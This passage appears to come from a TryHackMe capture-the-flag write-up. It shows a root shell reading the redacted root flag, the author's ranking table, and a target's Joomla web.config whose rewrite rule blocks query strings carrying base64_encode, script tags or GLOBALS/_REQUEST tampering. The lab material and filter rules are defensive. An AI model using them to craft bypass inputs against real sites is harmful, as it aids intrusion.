root@tryhackme-2404:/root# cat root.txt
THM{********************************}
```

<br>
<p>1.2. What is the value of the root-level flag?<br>
<code>THM{********************************}</code></p>
<br>
<br>
<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/02f981c5-0633-4f58-a37b-37004bac7a3d"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/e7b25ed6-882f-4b94-ad32-c40b4c18a6a6"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/a1d2c89b-7411-4fcc-a91e-8b9bd9caa33d"></p>


<br>
<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, September 1 | 483      |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ   |    15ᵗʰ    | 123,636  |    937    |    73     |

</div>


<p align="center">Global All Time:   111ˢᵗ<br><img width="250px" src="https://github.com/user-attachments/assets/87d4d449-43d0-42d9-b8a5-1ad6e6672963"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/a871adaa-f233-4df4-a6f0-43b060277aa9"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/d540e5de-8a3a-47f4-bfae-0b99755bbb0f"><br>
                  Global monthly:    849ʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/95a24424-5106-404f-9643-b555a1705957"><br>
                  Brazil monthly:     15ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/d7d7d0a3-6733-4eff-9422-2469b316a6fc"><br>

<br>
<br>

<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>






<h2>xx.xxx.xx.xx/web.config.txt</h2>

```bash
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <location path=".">
   <system.webServer>
       <directoryBrowse enabled="false" />
       <rewrite>
           <rules>
               <rule name="Joomla! Common Exploits Prevention" stopProcessing="true">
                   <match url="^(.*)$" ignoreCase="false" />
                   <conditions logicalGrouping="MatchAny">
                       <add input="{QUERY_STRING}" pattern="base64_encode[^(]*\([^)]*\)" ignoreCase="false" />
                       <add input="{QUERY_STRING}" pattern="(&gt;|%3C)([^s]*s)+cript.*(&lt;|%3E)" />
                       <add input="{QUERY_STRING}" pattern="GLOBALS(=|\[|\%[0-9A-Z]{0,2})" ignoreCase="false" />
                       <add input="{QUERY_STRING}" pattern="_REQUEST(=|\[|\%[0-9A-Z]{0,2})" ignoreCase="false" />
                   </conditions>
                   <action type="CustomResponse" url="index.php" statusCode="403" statusReason="Forbidden" statusDescription="Forbidden" />
               </rule>
               <rule name="Joomla! API Application SEF URLs">
                   <match url="^api/(.*)" ignoreCase="false" />
                   <conditions logicalGrouping="MatchAll">
                     <add input="{URL}" pattern="^/api/index.php" ignoreCase="true" negate="true" />
                     <add input="{REQUEST_FILENAME}" matchType="IsFile" ignoreCase="false" negate="true" />
                     <add input="{REQUEST_FILENAME}" matchType="IsDirectory" ignoreCase="false" negate="true" />
                   </conditions>
                   <action type="Rewrite" url="api/index.php" />
               </rule>
               <rule name="Joomla! Public Frontend SEF URLs">
                   <match url="(.*)" ignoreCase="false" />
                   <conditions logicalGrouping="MatchAll">
                     <add input="{URL}" pattern="^/index.php" ignoreCase="true" negate="true" />
                     <add input="{REQUEST_FILENAME}" matchType="IsFile" ignoreCase="false" negate="true" />
                     <add input="{REQUEST_FILENAME}" matchType="IsDirectory" ignoreCase="false" negate="true" />
                   </conditions>
                   <action type="Rewrite" url="index.php" />
               </rule>
           </rules>
       </rewrite>
       <httpProtocol>
           <customHeaders>
               <add name="X-Content-Type-Options" value="nosniff" />
               <!-- Protect against certain cross-origin requests. More information can be found here: -->
               <!-- https://developer.mozilla.org/en-US/docs/Web/HTTP/Cross-Origin_Resource_Policy_(CORP) -->
               <!-- https://web.dev/why-coop-coep/ -->
               <!-- <add name="Cross-Origin-Resource-Policy" value="same-origin" /> -->
               <!-- <add name="Cross-Origin-Embedder-Policy" value="require-corp" /> -->
           </customHeaders>
       </httpProtocol>
   </system.webServer>
   </location>
</configuration>
```
